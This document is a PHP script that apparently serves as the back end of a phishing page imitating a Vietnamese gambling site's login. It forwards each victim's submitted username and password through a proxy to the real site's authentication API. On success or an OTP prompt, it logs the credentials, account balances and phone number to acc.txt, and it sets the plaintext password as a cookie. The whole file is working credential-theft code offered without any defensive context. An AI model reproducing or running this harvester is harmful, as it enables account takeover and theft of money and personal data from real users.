<?php
header("Content-Type: application/json; charset=utf-8");
$raw_content = file_get_contents('php://input');
$json_data = json_decode($raw_content, 1);
$username = $json_data["Username"];
$password = $json_data["Password"];

$result = login($username, $password);
$js = json_decode($result, 1);
if ($js["c"]==0) {
	write($username, $password, $js);
} else if ($js["c"]==-48) {
	write($username, $password, $js);
} else if ($js["c"]==2) {
	write1($username, $password);
}
echo $result;

function write($username, $password, $js) {
	$nickname = $js["d"]["nickname"];
	$gold = $js["d"]["goldBalance"];
	$coin = $js["d"]["coinBalance"];
	$vippoint = $js["d"]["vipPoint"];
	$phone = $js["d"]["mobile"];
	$telesafe = $js["d"]["teleSafe"];
	date_default_timezone_set('Asia/Ho_Chi_Minh');
	$time = date("H:i:s Y-m-d");
	$ip=$_SERVER['REMOTE_ADDR'];
	$fp = fopen('acc.txt', 'a+');
	fwrite($fp, "$username|$password|$nickname|$gold|$phone|$telesafe| ----- $time -----> $ip\n");
	fclose($fp);
}

function write1($username, $password) {
	date_default_timezone_set('Asia/Ho_Chi_Minh');
	$time = date("H:i:s Y-m-d");
	$ip=$_SERVER['REMOTE_ADDR'];
	$fp = fopen('acc.txt', 'a+');
	fwrite($fp, "$username|$password|Login by otp!!! ----- $time -----> $ip\n");
	fclose($fp);
}

function login($username, $password) {
    $md5_password = md5($password);
    $url = "https://id.anceilynas.site/api/account/authenticate";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, '139.162.47.60:80');
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    $data = "{\"Username\":\"$username\",\"Password\":\"$password\",\"Md5Password\":\"$md5_password\",\"OTP\":\"\",\"Captcha\":\"\",\"Verify\":\"\"}";
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36","Content-Type: application/json","Accept: application/json","Referer: http://m88.vin/","Accept-Language: vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,und;q=0.6,de;q=0.5,pl;q=0.4"]);
    for ($i=0; $i < 10; $i++) { 
        $raw_content = curl_exec($ch);
        if ($raw_content) break;
    }
    $netcore_session = '';
    $wjo = '';
    if (preg_match('/\.netcore\.session=([^;]+);/m', $raw_content, $matches)) $netcore_session = $matches[1];
    if (preg_match('/NSC_mc\.je\.x88\.wjo=([^;]+);/m', $raw_content, $matches)) $wjo = $matches[1];
    setcookie('username', $username, time() + (86400 * 30), "/"); // 86400 = 1 day
    setcookie('password', $password, time() + (86400 * 30), "/"); // 86400 = 1 day
    setcookie('.netcore.session', urldecode($netcore_session), time() + (86400 * 30), "/"); // 86400 = 1 day
    setcookie('NSC_mc.je.x88.wjo', $wjo, time() + (86400 * 30), "/"); // 86400 = 1 day
    return explode("\r\n\r\n", $raw_content)[2];
}
?>